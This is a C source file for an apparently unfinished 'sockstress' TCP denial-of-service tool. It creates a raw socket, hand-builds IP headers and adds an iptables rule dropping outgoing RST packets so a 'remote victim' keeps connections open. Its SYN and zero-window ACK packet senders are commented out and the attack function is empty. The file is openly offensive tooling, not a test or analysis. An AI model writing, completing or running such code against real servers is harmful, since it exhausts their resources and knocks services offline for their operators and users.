#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <lib/info.h>
#include <lib/mem.h>
#include <lib/net.h>
#include <lib/util.h>

#include "sockstress.h"

/* static void send_tcp_syn(cfg_atk_t *cfg) */
/* { */
/* 	if (!cfg) */
/* 		INFOEE("Cannot send SYN TCP because cfg is NULL"); */
/*  */
/* 	struct tcphdr tcph; */
/*  */
/* 	// fill up the tcpheader */
/* 	memset(&tcph, 0, sizeof(tcph)); */
/* 	tcph.th_sport = htons(port_random()); */
/* 	tcph.th_dport = cfg->daddr.sin_port; */
/* 	tcph.th_seq   = htonl(cfg->seq); */
/* 	tcph.th_ack   = htonl(0); */
/* 	tcph.th_x2	  = 0; */
/* 	tcph.th_off   = 5; */
/* 	tcph.th_flags = TH_SYN; */
/* 	tcph.th_win   = htons(TCP_MAXWIN); */
/* 	tcph.th_urp   = htons(0); */
/* 	tcph.th_sum   = tcp4_checksum(&cfg->iph, &tcph); */
/*  */
/* 	memset(cfg->tcphdr_start, 0, sizeof(tcph)); */
/* 	memcpy(cfg->tcphdr_start, &tcph, sizeof(tcph)); */
/*  */
/* 	if (sendto(cfg->sk, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->daddr, sizeof(cfg->daddr)) < 0) */
/* 		INFOEE("Cannot send syn packet"); */
/* } */

/* static void send_tcp_ack(cfg_atk_t *cfg) */
/* { */
/* 	if(!cfg) */
/* 		INFOEE("Cannot send ACK TCP because cfg is NULL"); */
/*  */
/* 	struct tcphdr tcph; */
/* 	// fill up the tcpheader */
/* 	memset(&tcph, 0, sizeof(tcph)); */
/* 	tcph.th_sport = htons(port_random()); */
/* 	tcph.th_dport = cfg->daddr.sin_port; */
/* 	tcph.th_seq   = htonl(cfg->seq); */
/* 	tcph.th_ack   = htonl(0); */
/* 	tcph.th_x2	  = 0; */
/* 	tcph.th_off   = 5; */
/* 	tcph.th_flags = TH_ACK; */
/* 	tcph.th_win   = htons(0); #<{(|this|)}># */
/* 	tcph.th_urp   = htons(0); */
/* 	tcph.th_sum   = tcp4_checksum(&cfg->iph, &tcph); */
/*  */
/* 	memset(cfg->tcphdr_start, 0, sizeof(tcph)); */
/* 	memcpy(cfg->tcphdr_start, &tcph, sizeof(tcph)); */
/*  */
/* 	if (sendto(cfg->sk, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->daddr, sizeof(cfg->daddr)) < 0) */
/* 		INFOEE("Cannot send syn packet"); */
/* } */

/**
 * sockstress_init
 *
 * the method will initialize the procedure 
 * based on the args specified by the caller, 
 * this will create the sockets, create the internal buffers
 * and adding extra iptables rules in order 
 * to block the kernel for sending RST to the remote victim
 */
static void sockstress_init(arguments args)
{
	int err = system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null");
	if (!WIFEXITED(err)) {
		INFOEE("Cannot set the firewall to drop all rst's");
	}
	if (err == -1)
		INFOEE("Please check if iptables is installed and if this program is runned as root");

	// start seeding the random generator
	random_seed();

	struct sockaddr_in daddr;
	memset(&daddr, 0, sizeof(daddr));
	daddr.sin_family = AF_INET;
	daddr.sin_port   = htons(args.port.n);
	// we don't need to check once more this.
	inet_pton(daddr.sin_family, args.host, &daddr.sin_addr.s_addr); 

	// find the interface with the args.inf name and get the ip address in ipv4 form
	in_addr_t saddr = addr_if(args.inf, AF_INET);
	if (saddr == 0)
		INFOEE("Cannot retrive source address from interface list");

	// create - alloc the socket.
	int sk = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sk < 0)
		INFOEE("Cannot create the socket");

	// notify the kernel that we want to manually construct the ip header
	int on = 1;
	if (setsockopt(sk, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
		INFOEE("Cannot set socket option to include ip header");

	// fill up the ip header
	struct iphdr iph;
	iph.version  = 4; /* ipv version 4 */
	iph.ihl		 = 5; /* 20 bytes ip header length */
	iph.tos		 = 0;
	iph.ttl		 = 0xFF; /* 255 time to live */
	iph.frag_off = htons(0x4000); /* Do not fragment */
	iph.tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph.id		 = htons(U16_RAND());
	iph.saddr	 = saddr;
	iph.daddr	 = daddr.sin_addr.s_addr;
	iph.protocol = IPPROTO_TCP;
	iph.check	 = ip4_checksum(&iph);
}

/**
 * sockstress_attack
 *
 */
static void sockstress_attack(void)
{

}

/**
 * sockstress_cleanup
 *
 * Method for providing the cleanup process after 
 * the attack has been stopped. This will close all the sockets, 
 * frees up the buffers and removes any added iptable rules.
 */
static void sockstress_cleanup(void)
{
	int err = system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null");
	if (!WIFEXITED(err))
		INFOEE("Could not set the firewall to drop all rst's");

}

impl_t *sockstress_new()
{
	impl_t *impl = NULL;
	impl		 = xzmalloc(sizeof(*impl));
	impl->init   = sockstress_init;
	impl->attack = sockstress_attack;
	impl->clean  = sockstress_cleanup;

	return impl;
}
